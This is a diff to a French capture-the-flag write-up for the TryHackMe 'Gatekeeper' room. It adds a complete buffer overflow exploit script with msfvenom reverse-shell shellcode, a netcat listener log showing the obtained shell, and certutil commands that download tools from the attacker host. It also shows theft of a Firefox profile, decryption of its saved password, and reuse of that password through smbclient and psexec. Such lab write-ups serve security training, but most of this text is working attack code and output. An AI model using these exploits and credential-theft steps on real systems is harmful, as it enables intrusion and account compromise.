@@ -245,7 +245,14 @@ Pour ça rien de plus simple : https://bulbsecurity.com/finding-bad-characters-w
 ```py
 #!/usr/bin/python
 import socketimport sys
-badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f""\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40""\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f""\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f""\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f""\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf""\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf""\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
+badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
+"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
+"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
+"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
+"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
+"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
+"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
+"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
 
 offset_to_eip = 146
 total_size = 1000
@@ -277,7 +284,7 @@ Nous savons maintenant combien de caractères sont nécessaires pour réécrire 
 Nous allons générer notre shellcode maintenant pour connaitre sa taille, ça va nous permettre de déterminer où l'envoyer dans la mémoire.
 
 ```sh
-msfenom -p windows/shell_reverse_tcp LHOST=192.168.1.44 LPORT=5555 -f rb -b "\x00\x0a"
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.11.184 LPORT=5555 -f py -b "\x00\x0a"
 (...)
 Payload size: 351 bytes
 ```
@@ -339,7 +346,8 @@ L'objectif ici est de trouver un module sans ASLR & DEP activé et qui ne contie
 
 On trouve deux pointeurs utilisable, et aucun ne contient de mauvais caractères !
 
-* `0x080414c3 JMP ESP`* `0x080416bf JMP ESP`
+* `0x080414c3 JMP ESP`
+* `0x080416bf JMP ESP`
 
 Maintenant qu'un `JMP ESP` a été trouvé, nous devons le convertir au format Little Endian et l'ajouter à notre exploit.
 
@@ -347,7 +355,7 @@ Maintenant qu'un `JMP ESP` a été trouvé, nous devons le convertir au format L
 buffer += "\xc3\x14\x04\x08"
 ```
 
-#### Et s'il n'y à pas d'ASLR ni de DEP ?!
+#### Et s'il n'y a pas d'ASLR ni de DEP ?!
 
 "Trouver l’adresse exacte du début du shellcode est assez fastidieux mais, comme nous sommes fainéants, nous allons ruser et nous faciliter le travail : sur un processeur Intel x86, l’instruction 0x90 (ou NOP pour « No OPeration ») est une instruction qui ne fait pour ainsi dire rien du tout et passe à l’instruction suivante. L’idée est de placer un certain nombre de cette instruction avant le shellcode. Ainsi, il nous suffit de « tomber » sur une de ces instructions pour « glisser » vers le shellcode. Ca nous facilitera la vie car on ne devra plus trouver le début exact du shellcode, sauter sur une de ces instructions 0x90 suffira."
 
@@ -362,6 +370,182 @@ On y est presque !
 
 On remplace les "C" par notre shellcode et ajoute quelques NOP avant au cas ou.
 
+```py
+#!/usr/bin/python
+import socket, sys
+
+ip = '172.26.20.114'
+port = 31337
+
+shellcode = b""
+shellcode += b"\xbe\xd6\x2b\x47\x01\xda\xd6\xd9\x74\x24\xf4\x5f\x29"
+shellcode += b"\xc9\xb1\x52\x83\xef\xfc\x31\x77\x0e\x03\xa1\x25\xa5"
+shellcode += b"\xf4\xb1\xd2\xab\xf7\x49\x23\xcc\x7e\xac\x12\xcc\xe5"
+shellcode += b"\xa5\x05\xfc\x6e\xeb\xa9\x77\x22\x1f\x39\xf5\xeb\x10"
+shellcode += b"\x8a\xb0\xcd\x1f\x0b\xe8\x2e\x3e\x8f\xf3\x62\xe0\xae"
+shellcode += b"\x3b\x77\xe1\xf7\x26\x7a\xb3\xa0\x2d\x29\x23\xc4\x78"
+shellcode += b"\xf2\xc8\x96\x6d\x72\x2d\x6e\x8f\x53\xe0\xe4\xd6\x73"
+shellcode += b"\x03\x28\x63\x3a\x1b\x2d\x4e\xf4\x90\x85\x24\x07\x70"
+shellcode += b"\xd4\xc5\xa4\xbd\xd8\x37\xb4\xfa\xdf\xa7\xc3\xf2\x23"
+shellcode += b"\x55\xd4\xc1\x5e\x81\x51\xd1\xf9\x42\xc1\x3d\xfb\x87"
+shellcode += b"\x94\xb6\xf7\x6c\xd2\x90\x1b\x72\x37\xab\x20\xff\xb6"
+shellcode += b"\x7b\xa1\xbb\x9c\x5f\xe9\x18\xbc\xc6\x57\xce\xc1\x18"
+shellcode += b"\x38\xaf\x67\x53\xd5\xa4\x15\x3e\xb2\x09\x14\xc0\x42"
+shellcode += b"\x06\x2f\xb3\x70\x89\x9b\x5b\x39\x42\x02\x9c\x3e\x79"
+shellcode += b"\xf2\x32\xc1\x82\x03\x1b\x06\xd6\x53\x33\xaf\x57\x38"
+shellcode += b"\xc3\x50\x82\xef\x93\xfe\x7d\x50\x43\xbf\x2d\x38\x89"
+shellcode += b"\x30\x11\x58\xb2\x9a\x3a\xf3\x49\x4d\x4f\x04\xab\x26"
+shellcode += b"\x27\x06\x4b\x2c\x0b\x8f\xad\x24\x7b\xc6\x66\xd1\xe2"
+shellcode += b"\x43\xfc\x40\xea\x59\x79\x42\x60\x6e\x7e\x0d\x81\x1b"
+shellcode += b"\x6c\xfa\x61\x56\xce\xad\x7e\x4c\x66\x31\xec\x0b\x76"
+shellcode += b"\x3c\x0d\x84\x21\x69\xe3\xdd\xa7\x87\x5a\x74\xd5\x55"
+shellcode += b"\x3a\xbf\x5d\x82\xff\x3e\x5c\x47\xbb\x64\x4e\x91\x44"
+shellcode += b"\x21\x3a\x4d\x13\xff\x94\x2b\xcd\xb1\x4e\xe2\xa2\x1b"
+shellcode += b"\x06\x73\x89\x9b\x50\x7c\xc4\x6d\xbc\xcd\xb1\x2b\xc3"
+shellcode += b"\xe2\x55\xbc\xbc\x1e\xc6\x43\x17\x9b\xf6\x09\x35\x8a"
+shellcode += b"\x9e\xd7\xac\x8e\xc2\xe7\x1b\xcc\xfa\x6b\xa9\xad\xf8"
+shellcode += b"\x74\xd8\xa8\x45\x33\x31\xc1\xd6\xd6\x35\x76\xd6\xf2"
+
+
+buffer = "A"*146
+buffer += "\xc3\x14\x04\x08" # 0x080414c3 => EIP
+buffer += "\x90"*10 # Ajout des NOP au cas ou on tombe pas pile poil sur le bon offset
+buffer += shellcode
+
+try:
+    print '[+] Envoi de %s octets' % len(buffer)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    c = s.connect((ip, port))
+    s.send(buffer + "\r\n")
+    r = s.recv(1024)
+    print(r)
+except:
+    print("[+] Erreur:", sys.exc_info()[0])
+    sys.exit(0)
+finally:
+    s.close()
+```
+
+```sh
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.11.184 LPORT=5555 -f py -b "\x00\x0a" -n 10 -v shellcode
+```
+
+
+
+```
+kali@kali:~$ nc -lnvp 5555
+listening on [any] 5555 ...
+connect to [10.9.11.184] from (UNKNOWN) [10.10.246.212] 49202
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\natbat\Desktop>whoami
+whoami
+gatekeeper\natbat
+
+C:\Users\natbat\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\Desktop
+
+05/14/2020  09:24 PM    <DIR>          .
+05/14/2020  09:24 PM    <DIR>          ..
+04/21/2020  05:00 PM             1,197 Firefox.lnk
+04/20/2020  01:27 AM            13,312 gatekeeper.exe
+04/21/2020  09:53 PM               135 gatekeeperstart.bat
+05/14/2020  09:43 PM               140 user.txt.txt
+               4 File(s)         14,784 bytes
+               2 Dir(s)  15,850,921,984 bytes free
+
+C:\Users\natbat\Desktop>type user.txt.txt
+type user.txt.txt
+{H4lf_W4y_Th3r3}
+
+The buffer overflow in this room is credited to Justin Steven and his 
+"dostackbufferoverflowgood" program.  Thank you!
+```
+
+## Elevation de privilèges
+
+WinPEAS.bat
+
+
+certutil.exe -urlcache -split -f http://10.9.11.184/winPEAS.bat
+
+
+C:\Users\natbat>dir key4.db /s
+dir key4.db /s
+ Volume in drive C has no label.
+ Volume Serial Number is 3ABE-D44B
+
+ Directory of C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+
+04/21/2020  05:02 PM           294,912 key4.db
+               1 File(s)        294,912 bytes
+
+
+copy key4.db \Users\Share
+copy cert9.db \Users\Share
+copy logins.json \Users\Share
+copy cookies.sqlite \Users\Share
+
+
+https://github.com/unode/firefox_decrypt
+
+C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release
+
+
+certutil.exe -urlcache -split -f http://10.9.11.184/7za.exe
+
+
+7za.exe a -tzip ff.zip C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release\*.*
+
+
+kali@kali:~/thm/gatekeeper/smb$ firefox_decrypt.py ff/
+2020-07-09 16:48:53,235 - WARNING - profile.ini not found in ff/
+2020-07-09 16:48:53,235 - WARNING - Continuing and assuming 'ff/' is a profile location
+
+Master Password for profile ff/: 
+2020-07-09 16:48:57,020 - WARNING - Attempting decryption with no Master Password
+
+Website:   https://creds.com
+Username: 'mayor'
+Password: '8CL7O1N78MdrCIsV'
+
+
+
+kali@kali:~/thm/gatekeeper/smb$ smbclient -U mayor //10.10.233.170/Users
+Enter WORKGROUP\mayor's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Thu May 14 21:57:08 2020
+  ..                                 DR        0  Thu May 14 21:57:08 2020
+  All Users                         DHS        0  Tue Jul 14 01:08:56 2009
+  Default                           DHR        0  Tue Jul 14 03:07:31 2009
+  Default User                      DHS        0  Tue Jul 14 01:08:56 2009
+  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
+  mayor                               D        0  Sun Apr 19 11:55:52 2020
+  natbat                              D        0  Thu Jul  9 16:46:51 2020
+  Public                             DR        0  Thu May 14 21:54:46 2020
+  Share                               D        0  Thu Jul  9 16:47:38 2020
+
+		7863807 blocks of size 4096. 3856525 blocks available
+smb: \> cd mayor
+smb: \mayor\> cd Desktop
+smb: \mayor\Desktop\> dir
+  .                                  DR        0  Thu May 14 21:58:07 2020
+  ..                                 DR        0  Thu May 14 21:58:07 2020
+  desktop.ini                       AHS      282  Sun Apr 19 11:55:56 2020
+  root.txt.txt                        A       27  Thu May 14 21:21:09 2020
+
+		7863807 blocks of size 4096. 3856718 blocks available
+smb: \mayor\Desktop\> get root.txt.txt
+getting file \mayor\Desktop\root.txt.txt of size 27 as root.txt.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
+
+
+psexec.py mayor:8CL7O1N78MdrCIsV@10.10.233.170 cmd -path c:\\windows\\system32\\
 
 
 ## Sources:
